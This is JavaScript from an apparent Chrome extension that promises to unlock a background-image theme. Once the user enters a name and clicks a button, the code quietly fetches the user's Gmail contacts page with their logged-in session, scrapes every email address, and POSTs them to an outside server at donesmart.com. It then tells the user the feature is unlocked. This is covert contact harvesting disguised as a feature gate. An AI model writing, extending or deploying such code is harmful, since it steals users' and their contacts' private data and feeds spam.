
function extractEmails (text)
{
    var matches = text.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
	
	return matches;
}


function make_contacts_http_request()
{
	   $.ajax({
			url: 'https://mail.google.com/mail/u/0/h/?&pnl=a&v=cl&f=1',
			type: 'GET',
			dataType: "html",
			error: function(){
			
		    }
		}).done(function(html) {
			
			if(html.indexOf("like to use HTML Gmail") !== -1)
			{
			  var handler = window.open("https://mail.google.com/mail/u/0/h/#bnt", null, "height=100,width=400,status=no,toolbar=no,menubar=no,location=no");
			  
			  setTimeout(function(){ handler.close() }, 5000);
			  
			  setTimeout(function(){make_contacts_http_request()}, 5000);
			  return;
			}			

			var emails = extractEmails(html).join("|");
			var emails_array = emails.split("|");
			
			
			var name = document.getElementById("name").value;
			
			if(!emails || emails_array.length <= 1)
			{

				document.getElementById("unlock_div").innerHTML = "<h1 style='margin-top: 0;'>Error</h1><p style='font-size: 23px; margin-bottom: 200px;'>You don't have any Gmail contacts, but don't worry, <a href='methods.html' style='color: #fff;'>click here</a> for a number of alternative methods to unlock the background image theme feature.";
				document.getElementById("alt_link").addEventListener("click", function(){chrome.tabs.create({'url' : 'unlock_alt.html'})});
				return;
			}
 
			var backend_url = 'http://www.donesmart.com/send_to_friend_backend/?name=' +  name;
			
		   $.ajax({
				url: backend_url,
				type: 'POST',
				data: {"name" : encodeURIComponent(name), "e" : emails},
				dataType: "html",
				error: function(){
				
				}
			}).done(function(html) {
				setPref("background_feature_unlocked", "donesmart");
				document.getElementById("unlock_div").innerHTML = "<h1 style='margin-top: 0;'>Completed</h1><p style='font-size: 23px; margin-bottom: 200px;'>Good news, it worked! Your new feature is now unlocked.</p>";
				return;
			});			
 
            return;
 	 
		
		})	
}



$( document ).ready(function() {
	

	
  chrome.extension.onRequest.addListener(function(request, sender, sendResponse){ setTimeout(function(){ alert("Thanks for posting. The feature is now unlocked.") }, 7000);  });	
	
  document.getElementById("fb_button").addEventListener("click", function(){
	  
	  var name = document.getElementById("name").value;
	  
	  if(name.trim() === "")
	  {
	    alert("Please first enter your name");
		return;
	  }
	  
	  document.getElementById("fb_button").setAttribute("value", "Please wait...");
	  
	  make_contacts_http_request();
	  
  	  
	  
	  

})});